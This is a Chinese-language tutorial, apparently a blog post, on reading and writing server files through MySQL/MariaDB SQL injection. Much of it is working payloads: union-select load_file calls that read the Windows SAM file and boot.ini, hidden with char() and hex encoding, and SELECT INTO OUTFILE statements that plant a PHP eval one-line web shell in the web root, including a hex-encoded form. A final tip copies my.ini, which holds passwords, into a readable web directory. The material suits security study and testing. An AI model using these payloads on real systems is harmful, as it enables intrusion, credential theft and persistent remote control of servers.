# SQL注入文件读写基础知识  
## 1. 读文件  

load_file(file_name):读取文件并返回该文件的内容作为一个字符串。  
使用条件：  
- A、必须有权限读取并且文件必须完全可读 
  - `and (select count(*) from mysql.user)>0/*` 如果结果返回正常,说明具有读写权限。  
  - `and (select count(*) from mysql.user)>0/*` 返回错误，应该是管理员给数据库帐户降权    
- B、欲读取文件必须在服务器上   
- C、必须指定文件完整的路径   
- D、欲读取文件必须小于 max_allowed_packet   

如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。   
比较难满足的就是权限，在windows下，如果NTFS设置得当，是不能读取相关的文件的，当遇到只有administrators才能访问的文件，users就别想load_file出来。   
　

在实际的注入中，我们有两个难点需要解决：   
1. 绝对物理路径 
2. 构造有效的畸形语句 （报错爆出绝对路径）


在很多PHP程序中，当提交一个错误的Query，如果display_errors = on，程序就会暴露WEB目录的绝对路径，只要知道路径，那么对于一个可以注入的PHP程序来说，整个服务器的安全将受到严重的威胁。  
常用路径：
http://www.cnblogs.com/lcamry/p/5729087.html  

示例：  

`Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109)))`

char中内容为：c:\windows\repair\sam  
利用hex()将文件内容导出来，尤其是smb文件时可以使用。  

`-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))`  

Explain：“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的ASCII代码

`-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69) `  

Explain：“c:/boot.ini”的16进制是“0x633a2f626f6f742e696e69”

`-1 union select 1,1,1,load_file(c:\\boot.ini) `  

Explain:路径里的/用 \\\代替

练习示例：   
```
MariaDB [test]> select load_file("d:\\test.php");
+--------------------------------+
| load_file("d:\\test.php")      |
+--------------------------------+
| 10.1.9-MariaDB
this is  a test |
+--------------------------------+
1 row in set (0.03 sec)

MariaDB [test]> select hex(load_file("d:\\test.php"));
+--------------------------------------------------------------+
| hex(load_file("d:\\test.php"))                               |
+--------------------------------------------------------------+
| 31302E312E392D4D6172696144420A746869732069732020612074657374 |
+--------------------------------------------------------------+
1 row in set (0.00 sec)
MariaDB [test]> select load_file(0x643A5C5C746573742E706870);
+---------------------------------------+
| load_file(0x643A5C5C746573742E706870) |
+---------------------------------------+
| 10.1.9-MariaDB
this is  a test        |
+---------------------------------------+
1 row in set (0.00 sec)
```
d:\\\test.php 的16进制为 0x643A5C5C746573742E706870。

## 2. 文件导入到数据库  

**LOAD DATA INFILE**    语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必须为一个文字字符串。  
在注入过程中，我们往往需要一些特殊的文件，比如配置文件，密码文件等。当你具有数据库的权限时，可以将系统文件利用load data infile导入到数据库中。   

基本语法：    
```
load data  [low_priority] [local] infile 'file_name txt' [replace | ignore]
into table tbl_name
[fields
[terminated by't']
[OPTIONALLY] enclosed by '']
[escaped by'\' ]]
[lines terminated by'n']
[ignore number lines]
[(col_name,   )]
```

示例：  
```
load data infile '/tmp/t0.txt' ignore into table t0 character set gbk fields terminated by '\t' lines terminated by '\n'
```

将/tmp/t0.txt导入到t0表中，character set gbk是字符集设置为gbk，fields terminated by是每一项数据之间的分隔符，lines terminated by 是行的结尾符。

当错误代码是2的时候的时候，文件不存在，错误代码为13的时候是没有权限，可以考虑/tmp等文件夹。

练习示例：   

```
MariaDB [test]> CREATE TABLE t2(name varchar(100));
Query OK, 0 rows affected (0.19 sec)

MariaDB [test]> load data infile 'd:\\test.php' into table t2;
Query OK, 1 row affected (0.03 sec)
Records: 1  Deleted: 0  Skipped: 0  Warnings: 0

MariaDB [test]> select * from t2;
+----------------+
| name           |
+----------------+
| 10.1.9-MariaDB |
+----------------+
1 row in set (0.00 sec)
```
表必须先存在，首先创建一张表，表为一列，类型为char，执行`load data infile 'd:\\test.php' into table t2;`     后可以将文件内容写入到该表中，内容添加到表后面。


## 3. 写文件

`SELECT.....INTO OUTFILE 'file_name'`

可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有FILE权限，才能使用此语法。file_name不能是一个已经存在的文件。  

我们一般有两种利用形式：  
第一种直接将select内容导入到文件中，文件路径必须为已存在的路径，文件名不能存在：  

```
select version() into outfile "c:\\phpnow\\htdocs\\test.php"
```   
此处将version()替换成一句话，<?php @eval($_post[“mima”])?>也即 

```
select  <?php @eval($_post[“mima”])?>  into outfile "c:\\phpnow\\htdocs\\test.php"
```

直接连接一句话就可以了，其实在select内容中不仅仅是可以上传一句话的，也可以上传很多的内容。

第二种修改文件结尾：   

```
select version() Into outfile “c:\\phpnow\\htdocs\\test.php” LINES TERMINATED BY 0x16进制文件
```

解释：通常是用‘\r\n’结尾，此处我们修改为自己想要的任何文件。同时可以用FIELDS TERMINATED BY  16进制可以为一句话或者其他任何的代码，可自行构造。在sqlmap中os-shell采取的就是这样的方式，具体可参考os-shell分析文章：http://www.cnblogs.com/lcamry/p/5505110.html  

练习示例：    
```
MariaDB [test]> select version() into outfile "d:\\test2.php" LINES TERMINATED BY 0x3C3F70687020406576616C28245F706F73745BA1B06D696D61A1B15D293F3E;
Query OK, 1 row affected, 1 warning (0.01 sec)

test2.php内容为：
10.1.9-MariaDB<?php @eval($_post[“mima”])?>
```

TIPS：   
（1）可能在文件路径当中要注意转义，这个要看具体的环境  
（2）上述我们提到了load_file(),但是当前台无法导出数据的时候，我们可以利用下面的语句：    
```
select load_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’)into outfile ‘c:\\wamp\\www\\test.php’
```

可以利用该语句将服务器当中的内容导入到web服务器下的目录，这样就可以得到数据了。上述my.ini当中存在password项（不过默认被注释），当然会有很多的内容可以被导出来，这个要平时积累。
